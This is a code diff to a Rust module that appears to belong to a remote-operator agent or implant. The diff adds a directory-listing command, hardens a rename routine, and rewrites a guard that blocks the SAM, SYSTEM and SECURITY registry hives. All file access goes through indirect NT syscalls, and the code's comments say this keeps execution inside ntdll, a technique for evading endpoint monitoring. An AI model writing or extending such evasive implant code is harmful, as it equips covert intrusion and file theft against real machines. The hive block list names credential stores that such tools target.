@@ -2,7 +2,8 @@
 //!
 //! All file access goes through the **indirect-syscall runtime**
 //! ([`crate::syscalls`]) — `NtCreateFile`, `NtReadFile`, `NtWriteFile`,
-//! `NtSetInformationFile`, `NtQueryAttributesFile`, `NtClose`. The typed
+//! `NtSetInformationFile`, `NtQueryAttributesFile`, `NtQueryDirectoryFile`,
+//! `NtClose`. The typed
 //! wrappers in `syscalls` (e.g. [`crate::syscalls::nt_create_file`]) hide the
 //! syscall arity, so this module doesn't count macro arguments. Resolving these
 //! as NT syscalls (not Win32 exports) keeps the executing RIP inside ntdll and
@@ -120,16 +121,12 @@ const FILE_RENAME_INFO_CLASS: u32 = 10;
 #[allow(dead_code)]
 const FILE_DISPOSITION_INFO_CLASS: u32 = 4;
 /// FileDirectoryInformation class for NtQueryDirectoryFile (enum children).
-#[allow(dead_code)]
 const FILE_DIRECTORY_INFORMATION_CLASS: u32 = 1;
 /// `NtQueryDirectoryFile` "restart scan" arg (TRUE on first call, then FALSE).
-#[allow(dead_code)]
 const RETURN_SINGLE_ENTRY_FALSE: i32 = 0;
-#[allow(dead_code)]
 const RETURN_SINGLE_ENTRY_TRUE: i32 = 1;
 /// NTSTATUS "no more entries" from NtQueryDirectoryFile (STATUS_NO_MORE_FILES,
 /// 0x80000006 — a *warning*, success-severity, so nt_success() is true).
-#[allow(dead_code)]
 const STATUS_NO_MORE_FILES: i32 = 0x8000_0006_u32 as i32;
 /// NTSTATUS "directory not empty" — DeleteOnClose on a non-empty dir.
 #[allow(dead_code)]
@@ -273,24 +270,16 @@ fn allowed(path: &str) -> bool {
         return true;
     }
 
-    let blocked = [
-        "\\config\\sam",
-        "\\config\\system",
-        "\\config\\security",
-        "\\config\\software",
-        "\\config\\default",
-    ];
-    // `clean` is built by joining non-empty segments with `\`, so it has NO
-    // leading `\` (e.g. input "config\sam" → clean "config\sam"). The blocked
-    // entries all start with `\`, so a bare "config\sam" would NOT match
-    // "\config\sam" → hive guard bypassed (CVE-class: PR #41). Fix: build a
-    // check string with a guaranteed leading `\` so the substring match works
-    // regardless of whether the operator typed a leading slash.
-    let mut check_str = crate::heap::String::with_capacity(clean.len() + 1);
-    check_str.push('\\');
-    check_str.push_str(&clean);
-    for &b in &blocked {
-        if check_str.contains(b) {
+    // Component-aware hive check: refuse only when a `config` segment is
+    // immediately followed by a hive name. This is NOT a raw substring match,
+    // so `...\config\sam.txt` or `config\default.dat` (files that merely
+    // START with a hive name) stay allowed — matching the documented
+    // no-false-positive contract. Segments are already lowercased by the
+    // normalization above, and `..`/`.`/empty segments were collapsed into
+    // `segs`, so `\config\dummy\..\sam` still resolves to `config sam`.
+    const HIVE_NAMES: [&str; 5] = ["sam", "system", "security", "software", "default"];
+    for pair in segs.windows(2) {
+        if pair[0] == "config" && HIVE_NAMES.contains(&pair[1]) {
             return false;
         }
     }
@@ -684,7 +673,7 @@ pub fn do_download(rt: &Runtime, path: &str) -> Vec<Response> {
     }
 }
 
-/// `FileOp { op, path, dest }` — cd / mkdir / rm / mv / cp.
+/// `FileOp { op, path, dest }` — cd / mkdir / rm / mv / cp / ls.
 pub fn do_fileop(rt: &Runtime, op: FileOp, path: &str, dest: Option<&str>) -> Response {
     match op {
         FileOp::Cd => fileop_cd(rt, path),
@@ -698,6 +687,7 @@ pub fn do_fileop(rt: &Runtime, op: FileOp, path: &str, dest: Option<&str>) -> Re
             Some(d) => fileop_cp(rt, path, d),
             None => Response::Err(String::from("cp: missing dest")),
         },
+        FileOp::Ls => fileop_ls(rt, path),
     }
 }
 
@@ -882,6 +872,15 @@ fn fileop_mv(rt: &Runtime, path: &str, dest: &str) -> Response {
         Some(p) => p,
         None => return Response::Err(String::from("mv: invalid dest path")),
     };
+    // destbuf includes the `\??\` prefix from to_nt_path, so the usable name
+    // length is 256 chars. FILE_RENAME_INFORMATION carries a fixed 260-unit
+    // FileName array: reject an over-long destination instead of silently
+    // truncating — a truncated rename can land at a wrong path and, with
+    // replace_if_exists = 1, overwrite an existing unrelated file.
+    const MAX_RENAME_UNITS: usize = 260;
+    if destbuf.len() > MAX_RENAME_UNITS {
+        return Response::Err(String::from("mv: destination path too long"));
+    }
     unsafe {
         let handle = match open_file(
             rt,
@@ -905,10 +904,10 @@ fn fileop_mv(rt: &Runtime, path: &str, dest: &str) -> Response {
             }
         };
         // Build FILE_RENAME_INFORMATION. FileName is an in-place wide array —
-        // copy destbuf into it (capped at 260 chars).
+        // copy destbuf into it. destbuf is bounds-checked above (<= 260 units).
         let mut info: FileRenameInformation = core::mem::zeroed();
         info.replace_if_exists = 1;
-        let dn = destbuf.len().min(info.file_name.len());
+        let dn = destbuf.len();
         info.file_name[..dn].copy_from_slice(&destbuf[..dn]);
         info.file_name_length = (dn * 2) as u32;
         let mut set_iosb: IoStatusBlock = IoStatusBlock::default();
@@ -1047,6 +1046,132 @@ fn fileop_cp(rt: &Runtime, path: &str, dest: &str) -> Response {
         let _ = crate::syscalls::nt_close(rt, handle as usize);
     }
     Response::Ok
+}
+
+/// Ls: enumerate `path`'s children via NtQueryDirectoryFile
+/// (FileDirectoryInformation). Output is one entry per line, directories
+/// suffixed with '/' — the same convention the UI's ls parser consumes
+/// (client-ui-web FileTable.parseLsLines) and the dev agent emits.
+fn fileop_ls(rt: &Runtime, path: &str) -> Response {
+    if !allowed(path) {
+        return Response::Err(String::from("ls: refusing protected target"));
+    }
+    let handle = unsafe {
+        match open_file(
+            rt,
+            path,
+            // GENERIC_READ's generic mapping on a directory grants
+            // FILE_LIST_DIRECTORY (+ SYNCHRONIZE), enough for enumeration.
+            GENERIC_READ,
+            FILE_OPEN,
+            FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
+        ) {
+            Ok(h) => h,
+            Err(OpenError::BadPath) => return Response::Err(String::from("ls: invalid path")),
+            Err(OpenError::Unresolved) => {
+                return Response::Err(String::from("ls: NtCreateFile unresolved"))
+            }
+            Err(OpenError::Status(s)) => {
+                return Response::Err(String::from(format_ntstatus("ls open", s)))
+            }
+        }
+    };
+    // 64 KiB query buffer: FILE_DIRECTORY_INFORMATION is ~80 bytes + name, so
+    // one full buffer holds hundreds of entries — a handful of syscalls even
+    // for very large directories.
+    const DIR_BUF: usize = 64 * 1024;
+    let mut buf = crate::heap::vec![0u8; DIR_BUF];
+    let mut out = String::new();
+    let mut restart = RETURN_SINGLE_ENTRY_TRUE;
+    unsafe {
+        loop {
+            let mut iosb: IoStatusBlock = IoStatusBlock::default();
+            let st = crate::syscalls::nt_query_directory_file(
+                rt,
+                handle as usize,
+                0, // Event
+                0, // ApcRoutine
+                0, // ApcContext
+                &mut iosb as *mut IoStatusBlock as usize,
+                buf.as_mut_ptr() as usize,
+                DIR_BUF,
+                FILE_DIRECTORY_INFORMATION_CLASS,
+                RETURN_SINGLE_ENTRY_FALSE, // fill the buffer with all entries
+                0,                         // FileName = NULL: no wildcard mask
+                restart,
+            );
+            let status = match st {
+                Some(s) => s,
+                None => {
+                    let _ = crate::syscalls::nt_close(rt, handle as usize);
+                    return Response::Err(String::from(
+                        "ls: NtQueryDirectoryFile unresolved",
+                    ));
+                }
+            };
+            if status == STATUS_NO_MORE_FILES {
+                break; // enumeration drained
+            }
+            if !nt_success(status) {
+                let _ = crate::syscalls::nt_close(rt, handle as usize);
+                return Response::Err(String::from(format_ntstatus("ls", status)));
+            }
+            let got = iosb.information.min(DIR_BUF);
+            if got == 0 {
+                break; // defensive: STATUS_SUCCESS with zero bytes should not spin
+            }
+            // Walk the FILE_DIRECTORY_INFORMATION chain. Field offsets (Win64):
+            //   0  NextEntryOffset u32 | 4  FileIndex u32
+            //   8  CreationTime i64 ... 40 EndOfFile i64 | 48 AllocationSize i64
+            //   56 FileAttributes u32 | 60 FileNameLength u32 | 64 FileName WCHAR[]
+            let mut off = 0usize;
+            while off + 64 <= got {
+                let next_off =
+                    u32::from_le_bytes([buf[off], buf[off + 1], buf[off + 2], buf[off + 3]])
+                        as usize;
+                let attrs = u32::from_le_bytes([
+                    buf[off + 56],
+                    buf[off + 57],
+                    buf[off + 58],
+                    buf[off + 59],
+                ]);
+                let name_len = u32::from_le_bytes([
+                    buf[off + 60],
+                    buf[off + 61],
+                    buf[off + 62],
+                    buf[off + 63],
+                ]) as usize;
+                // Clamp to what the buffer actually holds and keep it even
+                // (WCHAR units); a truncated tail is dropped, not misread.
+                let name_bytes =
+                    (name_len.min(got.saturating_sub(off + 64)) / 2) * 2;
+                if name_bytes > 0 {
+                    let wide = core::slice::from_raw_parts(
+                        buf.as_ptr().add(off + 64) as *const u16,
+                        name_bytes / 2,
+                    );
+                    let name = String::from_utf16_lossy(wide);
+                    if !out.is_empty() {
+                        out.push('\n');
+                    }
+                    out.push_str(&name);
+                    if attrs & 0x0000_0010 != 0 {
+                        // FILE_ATTRIBUTE_DIRECTORY → '/' suffix marker.
+                        out.push('/');
+                    }
+                }
+                if next_off == 0 {
+                    break;
+                }
+                off += next_off;
+            }
+            restart = RETURN_SINGLE_ENTRY_FALSE;
+        }
+    }
+    // SAFETY: `handle` is the NtOpenFile-returned handle from above; the
+    // close is fail-soft by design (a close error is intentionally ignored).
+    unsafe { crate::syscalls::nt_close(rt, handle as usize) };
+    Response::Output(out.into_bytes())
 }
 
 // ---- small helpers --------------------------------------------------------
